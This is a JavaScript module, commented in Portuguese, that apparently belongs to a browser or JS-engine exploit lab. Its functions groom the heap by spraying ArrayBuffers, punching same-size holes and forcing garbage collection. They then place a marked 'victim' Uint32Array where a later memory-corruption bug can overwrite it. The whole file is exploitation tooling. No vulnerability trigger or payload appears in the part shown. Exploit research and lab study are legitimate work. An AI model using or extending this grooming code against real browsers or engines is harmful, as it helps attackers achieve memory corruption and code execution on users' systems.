// js/heap_groomer.mjs
import { log as appLog, PAUSE_LAB } from './utils.mjs'; // <<< Importa appLog

export let victim_object = null;
export let victim_object_type = 'TypedArray';
let spray_array_temp = []; // Interno ao módulo

export async function groomHeapForSameSize(spray_count, object_size, intermediate_alloc_count, victim_first = true) {
    const FNAME_GROOM = "HeapGroomer.groomHeap";
    appLog(`Iniciando heap grooming (obj_size=${object_size}, spray_count=${spray_count}, inter=${intermediate_alloc_count}, victim_first=${victim_first})`, "tool", FNAME_GROOM);
    spray_array_temp = []; // Reset
    const fill_size = object_size * 2 > 0 ? object_size * 2 : object_size + 16; // Evitar tamanho 0 se object_size for pequeno
    appLog(`   Fase 1: Spray com ${fill_size} bytes. Contagem: ${Math.floor(spray_count / 2)}`, "info", FNAME_GROOM);
    for (let i = 0; i < Math.floor(spray_count / 2); i++) { spray_array_temp.push(new ArrayBuffer(fill_size)); }
    appLog(`   Fase 2: Criando ${intermediate_alloc_count} buracos de ${object_size} bytes.`, "info", FNAME_GROOM);
    let holes = [];
    for (let i = 0; i < intermediate_alloc_count; i++) { holes.push(new ArrayBuffer(object_size)); }
    for (let i = 0; i < intermediate_alloc_count; i = i + 2) { holes[i] = null; }
    appLog(`   Fase 3: Spray final com ${object_size} bytes. Contagem: ${spray_count}`, "info", FNAME_GROOM);
    for (let i = 0; i < spray_count; i++) { spray_array_temp.push(new ArrayBuffer(object_size)); }
    if (typeof globalThis.gc === 'function') {
        appLog("Tentando forçar GC (x3)...", "tool", FNAME_GROOM);
        try { globalThis.gc(); await PAUSE_LAB(50); globalThis.gc(); await PAUSE_LAB(50); globalThis.gc();}
        catch(e){ appLog("Falha ao forçar GC: " + e.message, "warn", FNAME_GROOM);}
    }
    appLog("Heap grooming (tentativa) concluído.", "warn", FNAME_GROOM);
}

export async function prepareVictim(object_size) {
    const FNAME_PREP_VICTIM = "HeapGroomer.prepareVictim";
    victim_object = null; // Reset é importante no início de cada tentativa de preparação
    victim_object_type = 'TypedArray';
    appLog(`Tentando preparar vítima com object_size: ${object_size}`, "info", FNAME_PREP_VICTIM);

    if (object_size <= 0) {
        appLog(`ERRO CRÍTICO: Tamanho do objeto (${object_size}) é zero ou negativo.`, "error", FNAME_PREP_VICTIM);
        return false;
    }
    if (object_size % 4 !== 0) {
        appLog(`ERRO CRÍTICO: Tamanho do objeto (${object_size}) não é múltiplo de 4 para Uint32Array.`, "error", FNAME_PREP_VICTIM);
        return false;
    }

    const victim_typed_array_elements = object_size / 4;
    try {
        victim_object = new Uint32Array(victim_typed_array_elements);
        for(let i=0; i < victim_object.length; i++) { victim_object[i] = (0xBB000000 | i) ; }
        appLog(`Vítima (${victim_object_type}, ${victim_object.length} elems, ${victim_object.byteLength}b) alocada. Padrão: 0xBB00xxxx`, 'good', FNAME_PREP_VICTIM);
        return true; // Sucesso
    } catch (e) {
        appLog(`ERRO ao alocar Uint32Array para vítima (size: ${object_size}, elements: ${victim_typed_array_elements}): ${e.message}`, "error", FNAME_PREP_VICTIM);
        victim_object = null; // Garante que está nulo em caso de erro na alocação
        return false; // Falha
    }
}
